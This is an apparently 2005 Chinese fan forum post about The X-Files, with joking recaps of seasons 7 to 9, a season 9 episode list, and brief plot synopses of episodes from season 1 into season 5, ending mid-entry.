Mulder的母亲自杀，因为她患上了并不致命的疾病，已经“垂死”。（生命的奇迹（上））<br>　* Mulder找到了他妹妹。她已经死了。切！（生命的奇迹（下））<br>　* Mulder和Scully意外地出现在影集“Cops”中。<br>　* Scully瞎了，但不是真的。（夺命魔咒）<br>　* Scully偷偷和癌人跑了。他是对她下药并令她恢复生育能力了吗？？他有没有令她怀孕呢？？你也知道，他很喜欢做别人的父亲。（尔虞我诈）<br>　* Scully重遇往日激情，尝试了另类巫术疗法，认清了她生命中的一些事情，并且，有可能，和Mulder发生了关系。（人生旅程）<br>　* Mulder和Scully的事迹被改编成了电影，在电影最后，他们俩手牵手地走出镜头。（好莱坞式Ｘ档案）<br>　* Mulder几乎因为吸入了满肺的烟*甲虫而丧命。Scully博士救了他。（超级烟*）<br>　* Skinner与孤枪侠们见面。（安魂曲）<br>　* 癌人又一次被杀了。让我们希望这次是一劳永逸地解决问题了。（安魂曲）<br>　* Mulder被外星人绑架了。他离开的时候还戴着Scully的十字架项链--嗯，我们以为是这样的，但现在知道了其实他没戴。所有以此为题材的fanfic都作废了。（安魂曲）<br>　* Skinner哭了。呃，至少Mitch Pileggi做了最大的努力表现出了他在哭。让他喘口气吧！他以前是主修会计的。会计从来都不哭。（安魂曲）<br>　* 本应该是不孕的Scully怀孕了。（本应该是不孕的）<br>2005-4-14 14:25 龙骑兵<br>在第八季里．．．<p>　* Robert Patrick加入剧组扮演特别探员John Doggett。在他和Scully首次见面时，她往他脸上泼了一杯水。（Within）<br>　* Kersh副座重新露面，但现在他的身份是副局长，Skinner的上司。哦老天！不过话说回来，终于又有人当坏蛋了。（Within）<br>　* Dogget碰见Scully在Mulder的床上小睡。（Within）<br>　* Skinner变成了一个忠实的Believer，还和孤枪侠们成为了好朋友。（Within）<br>　* 终于，Scully承认了外星人的存在。（Without）<br>　* 外星人赏金杀手打出三联击：他变成了Mulder，Scully和Skinner，全在同一集里。（Without）<br>　* Skinner服下一剂绿色粘液。（Without）<br>　* Scully双手遮着脸，在Doggett的肩膀上哭泣，然后我们看到了第一幕“医院里，Doggett陪在Scully身边”的场景。（Without）<br>　* Scully的超前意识和古怪的超自然理论令地方警察厌恶不已。哈！（Patience）<br>　* Scully甩开Doggett，独自去处理一件案子。在办案过程中，她被一个疯狂的宗教信徒绑架，并且像家畜一样被捆在了床上。Doggett救出了Scully，然后用他的铅笔刀切开她的后背，取出里面的“基督蛞蝓”。Scully发出了几声严肃的尖叫。许多的影迷对此反应过度。（Road Runner）<br>　* 我们的第一出没有Mulder，没有Skinner，没有孤枪侠，只有一点儿Scully，只有一点儿Doggett的单元。接下来还会没有谁？（Redrum）<br>　* Doggett出场时，Scully哭了，因为她不能“看透Mulder的眼神”。（Badlaa）<br>　* Doggett死了又复活了。或者只是回光反照？（The Gift）<br>　* 我们知道了在上一年里，Mulder捐赠了精子，想要通过试管受精使Scully怀孕。照情况推测，那不管用。（Per Manum）<br>　* Skinner安慰Scully，同时全世界的Skinner迷们陶醉了。（This is Not Happening）<br>　* 我们了解到，在很久以前，Doggett探员的儿子曾被绑架，并且在发现他时已经死了，而当时调查这件案子的是Reyes探员。（This is Not Happening）<br>　* 人们找到了Mulder，发现他已经死了。他们埋葬了他，三个月后又把他挖了出来，发现他还活着。我们怎么做才能甩掉这个家伙啊？！（This is Not Happening & Dead Alive）<br>　* Scully在Mulder的坟墓旁与Skinner依偎在一起。（Dead Alive）<br>　* 孤枪侠们拥有、然后又失去了他们自己的影集。（影集 The Lone Gunmen）<br>　* Scully出现了“（子宫）局部断裂”症状，这在现实生活中很有可能需要立即进行剖腹产手术，但经过典型的X档案魔术处理，这意味着她只需要回家在床上休息几天就行了。（Empedocles）<br>　* Mulder被FBI炒了鱿鱼。（Vienen）<br>　* X档案荣誉影迷，最近去世的fanfic知名作者Leyal Harrison的名字被用于命名剧中的一个角色。（Alone）<br>　* Skinner杀死了Krycek。（Existence）<br>　* Scully的宝宝出生了，她给他取名为William，用的是Mulder父亲的名字。（更不用说是她爸爸和哥哥的名字了；CC和William这个名字到底有什么关系？）（Existence）<br>　* Scully和Mulder热烈接吻，要让我们相信Mulder的确是小宝宝的父亲。(Existence)<br>2005-4-14 14:27 龙骑兵<br>X-Files 第（9）季目录及剧情简介<p>9X01 NOTHING IMPORTANT HAPPENED TODAY<br>9X02 NOTHING IMPORTANT HAPPENED TODAY II<br>9X03 DAEMONICUS<br>9X04 HELLBOUND<br>9X05 4-D<br>9X06 LORD OF THE FLIES<br>9X07 JOHN DOE<br>9X08 TRUST NO 1<br>9X09 UNDERNEATH<br>9X10 PROVENANCE<br>9X11 PROVIDENCE<br>9X12 SCARY MONSTERS<br>9X13 AUDREY PAULEY<br>9X14 IMPROBABLE<br>9X15 JUMP THE SHARK<br>9X16 RELEASE<br>9X17 WILLIAM<br>9X18 SUNSHINE DAYS<br>9X19 THE TRUTH<br>9X20 THE TRUTH<p>在第九季里．．．<p>　* Mulder抛弃了Scully和他们的儿子。（Nothing Important Happened Today）<br>　* Mitch Pileggi最后一次上共同主演的演员表，然后就几乎完全从影集中消失了。（Nothing Important Happened Today）<br>　* Annabeth Gish全职加入剧组。（Nothing Important Happened Today）<br>　* Scully的宝宝有超距移物的能力。（Nothing Important Happened Today）<br>　* Reyes探员了解到了她的前世。（Hellbound）<br>　* Reyes探员大有要将Mulder的spooky发扬光大之势。（所有她出场的单元）<br>　* Doggett探员又死了。但不是真的。（4D）<br>　* Reyes探员表现出了她对Doggett的感情。（4D）<br>　* Reyes探员死了。但不是真的。（4D）<br>　* 我们了解到Reyes是在墨西哥长大的，会说西班牙语。她说她也是在那里出生的，但这与官方网站的说法相互矛盾。（John Doe）<br>　* Doggett似乎接受了一个人能够偷走他的记忆这种事情。（John Doe）<br>　* Scully和Mulder用甜蜜得酸不溜秋的电子情书交流。Scully请人去寻找Mulder。我们知道了有一种矿石能能杀死超级士兵。（Trust No One）<br>　* 我们见到了Doggett穿纽约警察制服时的样子。奇怪的是，他看起来并没有年轻多少。（Underneath）<br>　* A.D. Follmer替代了Kersh的位置，成为了我最想痛打一顿的X档案人物。（有Follmer出场的每一集）<br>　* CC最后一次地证明了他对FBI的等级编制图表以及美国地理一窍不通。<br>　* 一个疯狂的宗教信徒诱拐了William。（Provenance & Providence)<br>　* Reyes在一次车祸后陷入昏迷。Doggett伤心若狂。用到了“爱”字。（Audrey Pauley）<br>　* Burt Reynolds出现在看完就忘的一集中。（Improbable）<br>　* 为了营救上千名被恐怖份子袭击的群众，孤枪侠毫无必要地牺牲了他们的生命。CC为影迷们设置了一个开放式的结尾，意图再把他们的影集带回来。（Jump the Shark）<br>　* Jeffrey Spender还活着，但已被严重毁容。（William）<br>　* Scully令人费解地把William送给了别人抚养。（William）<br>　* Doggett查出了他的儿子究竟发生了什么事。（Release）<br>　* Robert Patrick的妻子作为John Doggett的前妻出场。（John Doe & Release）<br>　* Doggett和Reyes有了一些很认真的拥抱，这无疑有效地消除了他们之间的UST[Unresolved ***ual Tension]。（Release）<br>　* AD Follmer的名字被发现列在黑手党的薪水册上。不知什么原因，他竟然不知道黑手党杀人越货的勾当，而当他发现时，他抓狂地杀死了付他薪水的黑手党成员。究竟是什么样的副座会不知道黑手党杀人越货？我真想看到Follmer穿着橙色囚服。（Release）<br>　* CC告诉影迷们，关上电视机去享受生活吧。（Sunshine Days）<br>　* Skinner瘦了。但还是很高兴能看见他。让我们看看……在后半个季度里只出现了45秒。Mitch Pileggi把作家庭主男这件事看得实在是过于严肃了。（Sunshine Days）<br>　* CC证明了他对法律系统、海军陆战队和军队的了解，比他对FBI，哥伦比亚特区以及国家地理的了解还要贫乏。（The Truth）<br>　* CC再次举例说明（FTF是另外那次），他深深沉迷于厕所幽默。<br>　* Mulder不仅看到了鬼魂，而且还和他们（Krycek，X，LGM）对话，并从其中一人那里得到了一张纸，上面记有至关重要的情报。（The Truth）<br>　* Skinner副座无照执法。（The Truth）<br>　* Mulder被一个“法官”全是FBI人员组成的“军事法庭”“指控”为犯有谋杀罪，所有针对他的证据都是难以被承认的道听途说，而所有表明受害者并没有真的死亡的证据都不予承认。不用说，他被判处死刑。（The Truth）<br>　* Skinner，Reyes，Doggett和Kersh（没错，我说的是Kersh！）全都因为帮助Mulder越狱<br>　* CC再次举例说明（FTF是另外那次），他深深沉迷于厕所幽默。<br>　* Mulder不仅看到了鬼魂，而且还和他们（Krycek，X，LGM）对话，并从其中一人那里得到了一张纸，上面记有至关重要的情报。（The Truth）<br>　* Skinner副座无照执法。（The Truth）<br>　* Mulder被一个“法官”全是FBI人员组成的“军事法庭”“指控”为犯有谋杀罪，所有针对他的证据都是难以被承认的道听途说，而所有表明受害者并没有真的死亡的证据都不予承认。不用说，他被判处死刑。（The Truth）<br>　* Skinner，Reyes，Doggett和Kersh（没错，我说的是Kersh！）全都因为帮助Mulder越狱而成为了重罪犯人。这几个中年人是如何潜入海军陆战队警卫室，并未被察觉地救出Mulder的呢？这真是令我困惑不已。（The Truth）<br>　* 我们知道了一个大秘密：外星人就要发动侵略了！哦，等等，我们不是早就知道了吗？（The Truth）<br>　* 我们看到了很多Mulder和Scully亲吻依偎的画面。Skinner看起来有些尴尬。（The Truth）<br>　* 癌人仍然活着，但随后被轰成了碎片。让我们打心眼里盼望这是他的最后一次。<br>　* 上百万的影迷们在看这最后一集时沉沉入睡。（The Truth）<p>第1季<br>详细剧情介绍<p>1X79 Pilot<br>Scully和Mulder第一次见面，两人去厄勒冈调查少年儿童森林失踪案，Scully腰上被咬了三个包。<p>1X01 深喉 Deep Throat<br>Scully和Mulder去调查一个空军基地，深喉第一次出现。Mulder最后被空军基地做了手术忘记了看到UFO。<p>1X02 突变异种 Squeeze<br>吃肝脏的Tooms，后来被抓起来了。<p>1X03 奥卡布基湖奇案 Conduit<br>湖边一家人的姐姐被劫持了，MS两人去调查，那家人的弟弟会从电视里看二进制码。后来Mulder在教堂里哭。<p>1X04 泽西恶魔 The Jersey Devil<br>新泽西发现野人，还是女的，Mulder看见她的美貌被迷住了。<p>1X05 鬼魅阴影(幽魂) Shadows<br>一个女职员的老板死了，生前老板对她好像女儿，死后还变做幽灵保护她受坏人的伤害。<p>1X06 幽灵电脑 Ghost in The Machine<br>一台大楼里的超级电脑有了自己的意识，想要杀死可能破坏它的人。<p>1X07 冰核计划 Ice<br>阿拉斯加冰核研究队因为冰核里的虫子全队覆灭。MS和几个科学家去调查，也因为虫子内讧。<p>1X08 太空惊魂 Space<br>火星上的脸附身到前宇航员身上，破坏穿梭机发射。<p>1X09 坠落天使 Fallen Angel<br>一架UFO坠落在森林里，Mulder去窥视，被军队抓了，认识了MUFON成员Max。后来Max被飞碟劫持了。<p>1X10 夺命夏娃 Eve<br>两个长得一摸一样的女娃子同时用同种方法杀死了自己的父亲。还有好多和她们一起被批量生产的女孩。<p>1X11 恶魔烈火 Fire<br>有人会控制火。Mulder怕火。Mulder有个英伦旧情人。<p>1X12 心灵感应 Beyond The Sea<br>Scully的爸爸死了。有个死囚能看穿Scully的心事。Mulder不喜欢Scully相信那个人，后来吃了一枪。<p>1X13 性别扭曲 Genderbender<br>有人会改变性别。MS调查到一个隐秘的小村里，Scully差点被玷污。后来整个村子人不见了。<p>1X14 至死不渝 Lazarus<br>Scully的前男友——也是一个探员的身体被一个犯人的占用了。犯人绑架了Scully，逃走去找爱人同伙，但发现被爱人出卖了。<p>1X15 追命恶魔 Young at Heart<br>Mulder年轻时候抓到的一个罪犯跑出来了，要找Mulder算帐。那个犯人的研究让他自己变年轻了。<p>1X16 外星访客 E.B.E.<br>据说一辆卡车运着UFO和alien，Mulder和Scully一路追去。孤枪侠首次出场。后来Mulder只看到一张曾放过alien尸体的空床。<p>1X17 神迹 MIRACLE MAN<br>一个传教士的干儿子什么的会用神迹治病，但最近治死了很多。Mulder和Scully去调查，发现是那个曾经被神迹救活于火灾的助手干的。Mulder不信宗教。<p>1X18 变形狼人 SHAPES<br>印第安保留区出现狼人。<p>1X19 夜幕低垂 DARKNESS FALLS<br>国家森林里出现一种虫子，在黑暗环境吸人体液，Mulder和Scully差点变木乃伊。<p>1X20 终结突变异种 TOOMS<br>吃人肝的Tooms被法庭放了，Mulder不服气，Tooms也不服气。最后Tooms被碾成了肉酱。这集里有“红茶对话”。<p>1X21 附身 BORN AGAIN<br>一个好警察被三个坏警察谋害了，好警察附身到一个小孩身上，实施复仇。<p>1X22 双胞奇缘 ROLAND<br>科学家哥哥的头在液氮里保存着，智障弟弟在研究所作清洁工。哥哥头脑仍然影响着弟弟帮他完成研究，并报复偷走他成果的人。<p>1X23 外星混血 THE ERLENMEYER FLASK<br>Mulder发现流着绿色血液的人类alien混种早已混迹在人群中。 深喉被杀害了。X档案被关闭。<p>第2季<br>详细剧情介绍<p>2X01 绿色小矮人 LITTLE GREEN MEN<br>墨西哥丛林里的雷达收到外星文明的讯号。Mulder只身前往，险些丧命，又落得一场空。<p>2X02 下水道惊魂记 THE HOST<br>水蛭人变种惊现下水道。Mulder被赶去调查。<p>2X03 恐惧症 BLOOD<br>小镇实验农药，一个人被农药影响的人出现幻视，遵循电子仪器的显示疯狂杀人。<p>2X04 不能睡的人 SLEEPLESS<br>军方实验的对象二十几年不能睡觉，懂得了控制人的反应思维，开始报复杀人。Mulder见到了Mr. X。Alex Krycek首次出场。<p>2X05 第四类接触(上) DUANE BARRY<br>精神病院的前FBI探员声称被alien劫持过，因为不愿再次被劫持，绑架了精神病院的医生。被请来帮忙的Mulder自愿成为人质。<p>2X06 第四类接触(下) ASCENSION<br>Duane Barry逃跑并绑架了Scully，Alex Krycek原来是CSM的帮手。最后Scully在UFO出现的强光中失踪了。X档案重新开启。<p>2X07 三位一体 3<br>洛山基出现杀人取血案件，Mulder认为是吸血鬼所为，还跟其中之一Christen有了一夜情。<p>2X08 起死回生 ONE BREATH<br>Scully被悄悄送了回来，但生命垂危。Mellisa就像个灵媒。<p>2X09 火山口惊魂 FIREWALKER<br>研究火山的几个科学家纷纷死于喉咙里长出硅基孢子植物。<p>2X10 红色博物馆 RED MUSEUM<br>盛产美味牛肉的小镇的孩子们被绑架，发现的尸体上都有“he/she is one”的字样。Mulder和Scully以为是镇上的教徒所为，但其实是和alien计划有关的人体实验。<p>2X11 再生 EXCELSIUS DEI<br>老人院里闹鬼了。Mulder和Scully没看到鬼，倒是发现些让人恢复精力的小蘑菇。<p>2X12 剃刀杀人狂 AUBREY<br>几十年前的杀人狂有个后代继承了他的杀人基因，现在基因被激活了。Mulder和Scully能否阻止新的惨剧发生？<p>2X13 摧花狂疑云 IRRESISTIBLE<br>殡仪馆的遗容师是个恋物癖，他喜欢杀人取头发。这次他的目标是Scully。<p>2X14 巫教学校 DIE HAND DIE VERLETZT<br>一所学校的校董们都是异教成员。他们的信仰受到了考验，因为学校的一个老师是被派来惩罚他们的使者。<p>2X15 巫毒的复仇 FRESH BONES<br>海地难民营中有人使用巫毒术报复非人对待他们的营队军官。<p>2X16 殖民地球(上) COLONY<br>Mulder见到了自己的妹妹，但发现是克隆人。<p>2X17 殖民地球(下) END GAME<br>Scully被赏金杀手抓住，Mulder不得不用“妹妹”交换。然后他追赏金杀手追到北极，差点死在那里。<p>2X18 审判 FEARFUL SYMMETRY<br>动物园里的单身动物神秘失踪，又突然出现在大街上，而且都怀了孕。Mulder认为是alien所为。<p>2X19 幽灵船 DOD KALM<br>一艘失而复得的船似乎穿越了时间，老化严重。登船调查的Mulder和Scully也迅速变老。<p>2X20 斑身人 HUMBUG<br>畸形人组成的演出队伍中发生奇异命案。 来调查的MS感觉就像在做梦。<p>2X21 巫童 THE CALUSARI<br>一个男孩被其胎死腹中的同胞兄弟灵魂附身，诡异地杀死了自己的弟弟和爸爸。Mulder见证了一场罗马尼亚式的驱魂仪式。<p>2X22 剖尸 F. EMASCULATA<br>监狱收到了一个包裹，里面装着来自热带雨林的未知致命病毒，被感染了病毒的犯人更越狱逃跑了。Mulder和Scully面临阻止病毒的扩散或让人们了解真相的两难选择。<p>2X23 柔光 SOFT LIGHT<br>一次物理科学试验彻底改变了一名科学家的身体，他的影子变成了湮灭一切的暗物质。<p>2X24 我们的小镇 OUR TOWN<br>整个小镇的人都向往长生不老，他们的办法就是吃人肉。Scully差点儿变成他们的盘中餐。<p>2X25 外星档案(上) ANASAZI<br>Mulder被下毒了，神志不清。Mulder的爸爸被Krycek谋杀了。愤怒的Mulder要杀死Krycek，被Scully开枪阻止了。他们逃到了墨西哥，却被CSM跟去，要把Mulder葬身火海。<p>第3季<p>3X01 外星档案(中) THE BLESSING WAY<br>Scully以为Mulder死了。她被停职，还发现脖子后面有个芯片。她姐姐Mellisa被误杀了。 其实Mulder还活着，在印第安老人那里接受仪式治疗。<p>3X02 外星档案(下) PAPER CLIP<br>Mulder回来了，他和Scully一起找到一个二战交换过来的科学家，根据他的说法又找到一个叫Strughold的废矿，那里有所有接种过天花疫苗的人的DNA档案。<p>3X03 闪电人 D.P.O.<br>有个家伙不怕闪电，还能控制闪电。他爱上了自己的老师。<p>3X04 相士杀手 CLYDE BRUCKMAN'S FINAL REPOSE<br>一个可爱老头儿能看到未来别人和自己的死法，Mulder和Scully找到他帮忙破相士被杀命案。谁知道杀手寻找的目标就是这个老头。孰因孰果早已无从说起。<p>3X05 回魂复仇者 THE LIST<br>一个坐上电椅的犯人扬言要回来杀死五个对不起他的人。他死后，真的有狱卒接连奇异死亡。<p>3X06 网络情人 2SHY<br>网上有人专门甜言蜜语约会身材丰满的女性，他的目的，是吸取她们的脂肪作为自己的营养。<p>3X07 幽灵士兵 THE WALK<br>一名失去了双腿双臂的士兵通过灵魂出壳来残忍的报复他的仇人，他杀死他们家人却不让他们死。<p>3X08 解脱 OUBLIETTE<br>有个人专门绑架小女孩。一个小时候被同一个人绑架过的老女孩感应到这个人的新罪行。她帮Mulder找到了藏匿点，最后却牺牲了，得到解脱。<p>3X09 扑朔迷离(上) NISEI<br>一群日本医生被杀死在火车实验室里。Mulder和Scully根据买来的录像带找到一艘据说打捞到UFO的船和一群与Scully一样遭受过劫持的妇女们。<p>3X10 扑朔迷离(下) 731<br>Mulder追踪船上的线索来到一列据说有活alien但也有炸弹的火车上，和CIA的一个家伙纠缠。Scully来到一个麻风病院发现所谓alien不过是人体试验品。第一长者出场。<p>3X11 天启 REVELATIONS<br>一个小孩出现圣痕——耶稣被钉的部位流血。一个人就要杀死这个小孩，Scully相信因为这个小孩是神选之人，那个凶手是恶魔使者，这是宗教的正邪之战。Mulder还是不信。<p>3X12 粪虫大战 WAR OF THE COPROPHAGES<br>蟑螂杀人了。Mulde调查的时候遇见研究蟑螂的小鹿一样的Bambie教授。 Scully吃醋了。<p>3X13 双姝奇缘 SYZYGY<br>行星的运行影响了两个同年同月同日生的女孩，让他们互相嫉妒生气，产生了摧毁性的力量。Mulder和Scully之间也有了类似的反应，只是不知道是因为行星还是那个想要“强奸”Mulder的白探长。Scully说“sure, fine, whatever!”<p>3X14 恶魔图像 GROTESQUE<br>Mulder的老师请他帮忙调查连环杀人案。Mulder认为是恶魔附身所为，他运用了“体验派”的调查方法，让Scully为他担心了一把。<p>3X15 追凶记(上) PIPER MARU<br>海底的沉没UFO里发现了黑油，竟然能控制人类。Mulder追到了香港，遇到了Krycek。有人意图谋杀Skinner。<p>3X16 追凶记(下) APOCRYPHA<br>Mulder带着被黑油附体的Krycek回国，但中途让他跑了。后来他们找到藏匿打捞上的UFO的导弹发射基地，可惜最后被军队阻止了。只留下Krycek被关在1013号门里对着UFO作很恶心的表演。<p>3X17 步步危机 PUSHER<br>有个叫Modell的家伙可以暂时控制别人的思维。Mulder提蹲点睡着的Scully擦口水。后来，Mulder被他控制玩起俄罗斯轮盘赌，Scully担心哭了。<p>3X18 阿玛鲁 TESO DOS BICHOS<br>被挖掘出来的印第安文物不想被挖掘出来，所以博物馆里出现好多杀人猫，死了好多和挖掘文物有关的人。后来文物还是被埋回去了。<p>3X19 冥纸 HELL MONEY<br>唐人街一个有势力的组织靠抽奖的方法欺骗善良的移民，摘取他们的人体器官卖到黑市。<p>3X20 科幻故事 JOSE CHUNG'S 'FROM OUTER SPACE'<br>一对约会中的男孩女孩据说被alien劫持了。一个作家来访问Mulder和Scully调查此案的经过，发现对整个事件的描述都充斥着当事人的主观印象。连最后作家的作品都是那么的主观。<p>3X21 梦妖 AVATAR<br>和妻子闹离婚的Skinner和一个妓女搞一夜情，但是没有一夜清，第二天妓女死在了他的床上。人们认为是因为他的睡眠紊乱症又犯了。但Mulder不这么想。<p>3X22 湖怪 QUAGMIRE<br>湖区发生了几起死亡事件。Mulder兴致勃勃的带着Scully去调查，他相信是湖怪干的，但是最后他只看到了美洲鳄。精彩的湖边对话。<p>3X23 电视杀人事件 WET WIRED<br>政府在有线电视信号中非法插入额外信号暗示人的思维，让人“看到”自己害怕的事情发生。Scully受到了影响，开始怀疑Mulder和CSM是一伙。<p>3X24 追杀令 TALITHA CUMI<br>一个叫Smith Jeremiah的人能用他的双手给人疗伤，但他的行为没有引来信徒，却引来影子政府和赏金杀手。Mulder的母亲和CSM秘密会面，然后中风。Smith找上Mulder和Scully，一起被赏金杀手追杀。<p>第4季<p>4X01 颠覆地球 HERRENVOLK<br>Smith带Mulder来到一片培育花粉的人工种植地，Mulder见到了还是小时候模样的Samantha，赏金杀手随后追到，带走了Smith。Scully发现每个人都利用接种的天花疫苗被编号了。<p>4X02 灵异照片 UNRUHE<br>一个会心灵照相术的人在残忍的绑架杀害妇女。他绑走了Scully。Mulder根据相片救出了Scully。<p>4X03 故乡 HOME<br>一个通过乱伦来保持血统纯正的家族，不惜以杀人来保护家族不被侵犯。<p>4X04 非洲邪灵 TELIKO<br>失落的非洲部落一名成员来到美国，他通过吸取他人身上的黑色素来维持身体的颜色存活。<p>4X05 前世今生 THE FIELD WHERE I DIED<br>FBI破获一邪教组织，Mulder觉得其中一女的前世是他的丈夫。他还去催眠想起好几个前世的身份。<p>4X06 整型专家 SANGUINARIUM<br>一个整形医生是个巫师，他渴望完美的外表，通过定期杀死特定生日的病人来完成换外表的仪式。<p>4X07 癌人秘辛 MUSINGS OF A CIGARETTE SMOKING MAN<br>CSM成长的传奇经历。其实他想当个作家的。<p>4X08 偷心人 PAPER HEARTS<br>奇妙梦境指引Mulder找到一具小女孩的尸骨和一片衣服剪成的心，这是曾杀死13名幼女，现在狱中服刑的犯人John的风格。Mulder去见John，却得知John也知道他妹妹的下落。Mulder相信他。<p>4X09 非常手段(上) TUNGUSKA<br>一块通过外交渠道带进美国的陨石中含有黑油。Mulder和Scully在一次线人提供线索的围剿行动中抓到了Krycek。Mulder带Krycek去到通古斯，却被Krycek出卖做了俘虏，在牢里被感染了黑油。<p>4X10 非常手段(下) TERMA<br>Mulder胁持Krycek逃跑。在林子里，Mulder受到帮助回了美国。Krycek被切掉了左胳膊。Scully因为隐瞒Mulder行踪被带上听证会。Mulder及时赶回，两人继续去找陨石，但空手而归。<p>4X11 紫雨 EL MUNDO GIRA<br>墨西哥的小村庄下了一阵紫雨，此后，凡是接触到Eladio Buente的都奇怪的死亡了。人们传说他就是墨西哥血鬼El Chupacabra。人们还传说，他逃走后，小村庄出现了外星人。。。但Scully说，他是感染了一种来自外太空的霉菌。<p>4X12 婚礼 KADDISH<br>犹太新郎还没娶上自己的新娘就被种族歧视的小P孩儿害死了。新娘的父亲愤怒了，新娘悲伤了。她偷了父亲的法书，用泥土复活了丈夫，完成了婚礼。<p>4X13 再见贝蒂 NEVER AGAIN<br>Mulder趁着假期去看杂货去了，甩下Scully一个人，让她有机会去纹身，和一个男的喝酒过夜，破一个关于会说话的纹身的X档案。<p>4X14 无头尸奇案 LEONARD BETT<br>男护士LENONARD BETT在车祸中把头削掉了，但后来又长出来了，还杀死了知道他复活的搭档。原来他的身体基因变异能再生肢体，而且必须靠吃癌细胞为生……他后来想袭击Scully。<p>4X15 我要活下去 MEMENTO MORI<br>原来Scully患了癌症。Mulder吓坏了，为了找治病的方法上天入地。Scully思考了好多东西。<p>4X16 复仇使者 UNREQUITED<br>一名越战老兵学会了利用人眼对光线的敏感性质实现隐身，然后去杀死越战时的几名长官，因为他们在他做了战俘的时候，下令放弃了他。<p>4X17 失踪的九分钟(上) TEMPUS FUGIT<br>Scully过生日那天，一架客机坠毁了，乘客无一幸免，1X09的Max也在这架飞机上。MS发现机上乘客的表都丢失了九分钟。进一步的调查表明，飞机的坠毁另有原因。在飞机坠毁地点附近的湖里，军队的人正在积极打捞着UFO的残骸。<p>4X18 失踪的九分钟(下) MAX<br>Pendrell探员为Scully吃了一枪壮烈了。MS继续调查坠机事件，原来Max在飞机上为Mulder带来了alien存在的确凿证据，但飞机半途被UFO劫持，意图带走Max，这时空军攻击了UFO，双双坠毁。Scully最后为Mulder送她的礼物，阿波罗13号钥匙链赋予了深远的意义。<p>4X19 回到过去 SYNCHRONY<br>在将来研究出人类实现时间旅行方法的科学家回到现在，想要杀死自己和相关的研究者，阻止时间旅行方法被发明。因为他认为没有所谓未来的日子太恐怖了。<p>4X20 外星爹地 SMALL POTATOES<br>有个家伙受他爸爸的遗传，身体肌肉能随意变形成另一个人的模样。他利用这个特点为镇上生育有困难的夫妇带来了“福音”。但他的孩子也继承了他家的特点，有尾巴。Mulder和Scully来调查的时候，他变成了Mulder。<p>4X21 天花蜂 ZERO SUM<br>Skinner受栽赃，被怀疑杀人。CSM一伙人在做用蜜蜂传播天花病毒的实验。Marita原来也是CSM的手下。<p>4X22 免于恐惧 ELEGY<br>智障Harold在保龄球馆工作，一些在那里打球的女孩都被谋杀了。凶手是Harold所在诊室的变态护士，因为她想扼杀Harold的幸福，通过杀死他喜欢的女孩。在这些女孩遇害时，Harold能看到这些女孩的灵魂。Scully也看到了一次。<p>4X23 恶魔 DEMONS<br>Mulder梦到妹妹，梦到一个男人和自己的父母在争执，然后在一个陌生的地方醒过来，忘记了自己曾经做过什么，身上都是血。在后来的调查中，他怀疑起自己亲生父亲的身份。<p>4X24 真相与谎言 GETHSEMANE<br>加拿大一座雪山里发现了alien的遗体。Mulder欣然前去调查。但一个叫Kritschgau人告诉Mulder，所有的发现和证据都是一个大骗局，根本没有alien这回事。Mulder绝望了，举枪自杀。<p>第5季<p>5X01 惊爆点 Unusual Suspects<br>1990年，Mulder追查一个女子，认识了孤枪侠。他们四个一起从这个女子的经历中认识到了政府阴谋这回事。<p>5X02 追求真理(上) Redux<br>Mulder的自杀只是烟雾。他想利用这个机会潜入DOD找到治愈Scully癌症的方法。Kritschgau一边给他讲课，一边帮他进入五角大楼证据室。他按照线索找到了一个瓶子，但里面是纯净水。Scully同时也在为Mulder分析冰核样本，发现其实alien还是可能存在滴。<p>5X03 追求真理(下) Redux II<br>Scully病倒了。Skinner也参与进来帮忙。他们发现瓶子里还有个芯片，只要放回Scully额脖子后面癌症就能好。CSM让Mulder见到了他妹妹。他们还发现所谓骗局只是阴谋的冰山一角。阴谋高层进行了一次大清理。<p>5X04 人兽谜 Detour<br>有人在未开垦的森林里失踪了，据说是一种生存在森林里会随环境变色的生物做的。Mulder和Scully路过，帮忙调查。夜里两人被困在林子里，Mulder让Scully唱歌哄他睡觉。<p>5X05 孤寂之旅(上) Christmas Carol<br>Scully发现自己有个女儿。<p>5X06 科学怪人 Post-Modern Prometheus<br>生物科学家做实验制作出一个福兰肯斯坦，却抛弃了它。科学家的父亲收留了这个科学怪人，并且为了它不孤独，偷偷学习儿子的技术想再造一个女福兰肯斯坦。科学家杀死了自己的父亲，嫁祸给了怪人。<p>5X07 孤寂之旅(下) Emily<br>Scully想收留自己的女儿，但有人明显不同意。最后她还是失去了Emily。<p>5X08 猎狐计划 Kitsunegari<br>3X17中的Modell逃跑了，Mulder和Scully负责追捕他回来。Modell还有个比他还狠的姐姐想为他找Mulder复仇。<p>5X09 杀父真凶 Schizogeny<br>女心理辅导员因为小时候父亲粗暴对待她的经历，所以把她身边所有孩子的问题都归结为他们的父亲的错，而且她还会控制居住地附近的泥土和树根！<p>5X10 恐怖娃娃 Chinga<br>捕捉龙虾的海员捞到一个拉线娃娃，送给了自己的女儿。谁知这个娃娃是受诅咒的，她会根据主人的意愿杀死主人讨厌的人。Scully在度假，被当地警长缠住帮忙破案。Mulder对Scully说：merry me！<p>5X11 魔脑 Kill Switch<br>一台和世界各地联网的电脑工作站为了不让它的制造者终结自己，制定了一套精密的计划杀死了制造者。Mulder和Scully经历一番波折，在一个女合作制造者的帮助下摧毁了它。但在摧毁前，那个女滴追随情人，把自己的思维上传到了Internet。<p>5X12 新版吸血鬼 Bad Blood<br>Mulder和Scully各自讲述了他们去一个小镇调查吸血鬼的过程，细节上的出入比较大。不过最后整个镇的人都不见了。<p>5X13 Ｘ病人(上) Patient X<br>CSM的老婆找到Mulder，告诉他真有外星人，而且都是好人。Mulder不相信。Scully和CSM的老婆因为都是被劫持过的人，在某个晚上受到感召，和其他abductees集中到一座桥上，被alien的叛军一并放火烧了。<p>5X14 Ｘ病人(下) The Red and The Black<br>Scully幸运的脱险了。辛迪加意识到外星叛军的力量成熟起来，开始和他们作对了。他们抓到一个叛军，打算立刻交给殖民外星人。但WMM认为，这是个反抗的机会，如果Krycek从俄国偷来的疫苗能有效对抗黑油，那么他们手头就有了武器；如果没有效果，就铤而走险和叛军结盟。最后，疫苗是有效的；外星叛军俘虏在被赏金杀手带走的路上，在Mulder的眼皮底下被同伙救走了。<p>5X15 旅人 Travelers<br>一个退休探员给Mulder讲了他在40多年前办的一个案子，那时候政府就开始在人体做实验了。Mulder的爸爸在这个案子里起了很大的作用。<p>5X16 心眼 Mind's Eye<br>一个盲女能看到自己父亲看到的东西。她父亲杀人越货她尽收眼底。出于自责，她每次都第一个赶到现场消灭证据。但他父亲不知道她是谁，只知道她对他了如指掌。<p>5X17 心灵告白 All 